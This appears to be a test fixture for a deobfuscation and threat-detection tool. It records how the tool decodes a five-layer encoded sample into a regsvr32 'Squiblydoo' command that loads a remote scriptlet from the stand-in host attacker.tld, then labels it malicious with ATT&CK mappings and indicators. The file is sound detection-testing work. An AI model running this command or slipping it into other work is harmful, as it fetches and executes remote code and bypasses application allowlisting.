@@ -1,0 +1,851 @@
+{
+  "sample_id": "R2_S07_regsvr_5layer",
+  "wrap": "URL(b64(hex(rev(b64(P)))))",
+  "input": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2NmY0NDYzMzA1MjQ4NjEzNjZiMzI0YzY3NGQzMzRjNjc1NTMzNGM2NzQ5N2E0ZDc5NWEzMzYzNmU1NjZkNjM%3D",
+  "input_sha1": "bc1327b2d6ec5508efd79c430d461298ff209c2f",
+  "expected_plaintext": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+  "expected_token": "regsvr32",
+  "http_ms": 13894,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload"
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "regsvr32-annotate",
+        "args": {},
+        "reason": "Applied regsvr32-annotate"
+      }
+    ],
+    "output": "# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---\n# T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32\n# Scriptlet URL: http://attacker.tld/file.sct\nregsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_REGSVR32_SCRIPTLET \u00b7 conf 100/100\n  Chain:       url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode \u2192 regsvr32-annotate\n\n  MITRE ATT&CK\n    T1218.010    \u00b7 Defense Evasion\n    T1105        \u00b7 Command and Control\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       regsvr32.exe, Scrobj.dll\n\n  IOCs\n    URL       http://attacker.tld/file.sct\n    Domain    attacker.tld\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: Regsvr32 scriptlet loader / Squiblydoo (T1218.010) \u2014 detects regsvr32 /u /s /i:http://... scrobj.dll pattern."
+    ],
+    "detected_type": null,
+    "engine": "smart+archetype:LOLBAS_REGSVR32_SCRIPTLET",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters",
+        "output_preview": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2NmY0NDYzMzA1MjQ4NjEzNjZiMzI0YzY3NGQzMzRjNjc1NTMzNGM2NzQ5N2E0ZDc5NWEzMzYzNmU1NjZkNjM=",
+        "output_length": 204,
+        "evidence": {
+          "encoding": "URL percent-encoding",
+          "op": "url-decode",
+          "length": 204,
+          "ascii": true,
+          "entropy": 4.339,
+          "hex_preview": "4e 7a 4d 33 4f 44 51 33 4e 57 45 33 4e 54 5a 6d \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "7378475a756f6d59764a33597a4243646a4e6e4c6c7857616d39435a73526e4c795632616a4647643046324c766f446330524861366b324c674d334c6755334c67497a4d795a33636e566d63",
+        "output_length": 152,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 152,
+          "ascii": true,
+          "entropy": 3.467,
+          "hex_preview": "37 33 37 38 34 37 35 61 37 35 36 66 36 64 35 39 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload",
+        "output_preview": "sxGZuomYvJ3YzBCdjNnLlxWam9CZsRnLyV2ajFGd0F2LvoDc0RHa6k2LgM3LgU3LgIzMyZ3cnVmc",
+        "output_length": 76,
+        "evidence": {
+          "encoding": "Hexadecimal ASCII",
+          "op": "hex-decode",
+          "length": 76,
+          "ascii": true,
+          "entropy": 5.08,
+          "hex_preview": "73 78 47 5a 75 6f 6d 59 76 4a 33 59 7a 42 43 64 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse",
+        "output_preview": "cmVnc3ZyMzIgL3UgL3MgL2k6aHR0cDovL2F0dGFja2VyLnRsZC9maWxlLnNjdCBzY3JvYmouZGxs",
+        "output_length": 76,
+        "evidence": {
+          "encoding": "String reversal",
+          "op": "reverse",
+          "length": 76,
+          "ascii": true,
+          "entropy": 5.08,
+          "hex_preview": "63 6d 56 6e 63 33 5a 79 4d 7a 49 67 4c 33 55 67 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+        "output_length": 57,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 57,
+          "ascii": true,
+          "entropy": 4.337,
+          "hex_preview": "72 65 67 73 76 72 33 32 20 2f 75 20 2f 73 20 2f \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "regsvr32-annotate",
+        "args": {},
+        "reason": "Applied regsvr32-annotate",
+        "output_preview": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+        "output_length": 57,
+        "evidence": {
+          "encoding": "regsvr32-annotate",
+          "op": "regsvr32-annotate",
+          "length": 57,
+          "ascii": true,
+          "entropy": 4.337,
+          "hex_preview": "72 65 67 73 76 72 33 32 20 2f 75 20 2f 73 20 2f \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "url-decode",
+      "base64-decode",
+      "hex-decode",
+      "reverse",
+      "base64-decode",
+      "regsvr32-annotate"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 206,
+        "length_bucket": "s",
+        "entropy": 4.347,
+        "b64_density": 0.995,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "mixed",
+        "entropy": 4.347,
+        "length": 206,
+        "letter_ratio": 0.84,
+        "digit_ratio": 0.155,
+        "punct_ratio": 0.005,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.653,
+        "priors": [],
+        "reasons": [
+          "mixed-shape"
+        ]
+      },
+      "output_profile": {
+        "kind": "text_like",
+        "entropy": 5.002,
+        "length": 215,
+        "letter_ratio": 0.679,
+        "digit_ratio": 0.06,
+        "punct_ratio": 0.149,
+        "space_ratio": 0.112,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.103,
+        "priors": [
+          "rot-n-brute",
+          "atbash",
+          "reverse",
+          "xor-single-byte"
+        ],
+        "reasons": [
+          "text-shape"
+        ]
+      },
+      "input_linguistic_score": 0.0333,
+      "output_linguistic_score": 0.9719,
+      "linguistic_delta": 0.9386,
+      "confidence": {
+        "confidence": 0.8154,
+        "band": "high",
+        "structural": 0.7,
+        "readability": 0.9848,
+        "entropy_sanity": 0.8,
+        "context": 0.75,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: printable=1.00, linguistic=0.97",
+          "entropy: mixed-content-entropy=5.00",
+          "context: output-has-actionable-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.9848,
+            "reason": "printable=1.00, linguistic=0.97"
+          },
+          "entropy_sanity": {
+            "score": 0.8,
+            "reason": "mixed-content-entropy=5.00"
+          },
+          "context": {
+            "score": 0.75,
+            "reason": "output-has-actionable-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode \u2192 regsvr32-annotate] substantially improved readability (\u0394=+0.939 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 1,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 5,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://attacker.tld/file.sct"
+          ],
+          "ips": [],
+          "domains": [
+            "attacker.tld"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "regsvr32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.010"
+            ],
+            "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+            "snippet": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+            "source": "curated"
+          },
+          {
+            "binary": "Scrobj.dll",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "Download file from remote location.",
+            "snippet": "tacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+            "source": "lolbas-api"
+          }
+        ]
+      },
+      {
+        "layer": 6,
+        "op": "regsvr32-annotate",
+        "iocs": {
+          "urls": [
+            "http://attacker.tld/file.sct"
+          ],
+          "ips": [],
+          "domains": [
+            "attacker.tld"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "regsvr32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.010"
+            ],
+            "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+            "snippet": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+            "source": "curated"
+          },
+          {
+            "binary": "Scrobj.dll",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "Download file from remote location.",
+            "snippet": "tacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+            "source": "lolbas-api"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 80,
+      "reason": "URL surfaced in decoded output: http://attacker.tld/file.sct.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.00) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL percent-encoding layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Hexadecimal ASCII layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "String reversal layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://attacker.tld/file.sct",
+          "kind": "positive"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://attacker.tld/file.sct",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 80
+    },
+    "iocs": {
+      "urls": [
+        "http://attacker.tld/file.sct"
+      ],
+      "ips": [],
+      "domains": [
+        "attacker.tld"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1218.010",
+        "technique": "Regsvr32 (Squiblydoo)",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "regsvr32.exe",
+        "purposes": [
+          "Execute",
+          "AWL Bypass"
+        ],
+        "mitre": [
+          "T1218.010"
+        ],
+        "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+        "snippet": "mU1NjZkNjM%3D # --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) --- # T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32 # Scriptlet URL: http://attacker.tld/file.s",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+        "source": "curated"
+      },
+      {
+        "binary": "Scrobj.dll",
+        "purposes": [
+          "Download"
+        ],
+        "mitre": [
+          "T1105"
+        ],
+        "description": "Download file from remote location.",
+        "snippet": "tacker.tld/file.sct scrobj.dll NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2NmY0NDYzMzA1MjQ4NjE",
+        "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+        "source": "lolbas-api"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2NmY0NDYzMzA1MjQ4NjEzNjZiMzI0YzY3NGQzMzRjNjc1NTMzNGM2NzQ5N2E0ZDc5NWEzMzYzNmU1NjZkNjM%3D",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "NzM3ODQ3NWE3NTZmNmQ1OTc2NGEzMzU5N2E0MjQzNjQ2YTRlNmU0YzZjNzg1NzYxNmQzOTQzNWE3MzUyNmU0Yzc5NTYzMjYxNmE0NjQ3NjQzMDQ2MzI0Yzc2",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 5,
+        "label": "L5 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://attacker.tld/file.sct attacker.tld",
+        "iocs": {
+          "urls": [
+            "http://attacker.tld/file.sct"
+          ],
+          "ips": [],
+          "domains": [
+            "attacker.tld"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "regsvr32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.010"
+            ],
+            "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+            "snippet": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+            "source": "curated"
+          },
+          {
+            "binary": "Scrobj.dll",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "Download file from remote location.",
+            "snippet": "tacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+            "source": "lolbas-api"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "attacker",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "attacker.tld",
+              "classification": {
+                "tld": "tld",
+                "is_high_risk_tld": false,
+                "is_onion": false,
+                "length": 12,
+                "has_dashes": false,
+                "num_subdomains": 0
+              },
+              "resolved_ips": [],
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": null
+            }
+          ],
+          "urls": [
+            {
+              "value": "http://attacker.tld/file.sct",
+              "scheme": "http",
+              "host": "attacker.tld",
+              "path": "/file.sct",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 22,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 6,
+        "label": "L6 \u00b7 REGSVR32-ANNOTATE",
+        "op": "regsvr32-annotate",
+        "preview": "http://attacker.tld/file.sct attacker.tld",
+        "iocs": {
+          "urls": [
+            "http://attacker.tld/file.sct"
+          ],
+          "ips": [],
+          "domains": [
+            "attacker.tld"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "regsvr32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.010"
+            ],
+            "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+            "snippet": "regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+            "source": "curated"
+          },
+          {
+            "binary": "Scrobj.dll",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "Download file from remote location.",
+            "snippet": "tacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+            "source": "lolbas-api"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "attacker",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 22,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---\n# T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32\n# Scriptlet URL: http://attacker.tld/file.sct\nregsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+        "iocs": {
+          "urls": [
+            "http://attacker.tld/file.sct"
+          ],
+          "ips": [],
+          "domains": [
+            "attacker.tld"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "regsvr32.exe",
+            "purposes": [
+              "Execute",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1218.010"
+            ],
+            "description": "regsvr32 Squiblydoo \u2014 /i /u remote SCT execution bypasses AWL",
+            "snippet": "# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) --- # T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32 # Scriptlet URL: http://attacker.tld/file.s",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/regsvr32/",
+            "source": "curated"
+          },
+          {
+            "binary": "Scrobj.dll",
+            "purposes": [
+              "Download"
+            ],
+            "mitre": [
+              "T1105"
+            ],
+            "description": "Download file from remote location.",
+            "snippet": "tacker.tld/file.sct scrobj.dll",
+            "url": "https://lolbas-project.github.io/lolbas/Libraries/Scrobj/",
+            "source": "lolbas-api"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1218.010",
+            "technique": "Regsvr32 (Squiblydoo)",
+            "tactic": "Defense Evasion"
+          },
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "Scriptlet",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 32,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---\n# T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32\n# Scriptlet URL: http://attacker.tld/file.sct\nregsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_REGSVR32_SCRIPTLET \u00b7 conf 100/100\n  Chain:       url-decode \u2192 base64-decode \u2192 hex-decode \u2192 reverse \u2192 base64-decode \u2192 regsvr32-annotate\n\n  MITRE ATT&CK\n    T1218.010    \u00b7 Defense Evasion\n    T1105        \u00b7 Command and Control\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       regsvr32.exe, Scrobj.dll\n\n  IOCs\n    URL       http://attacker.tld/file.sct\n    Domain    attacker.tld\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
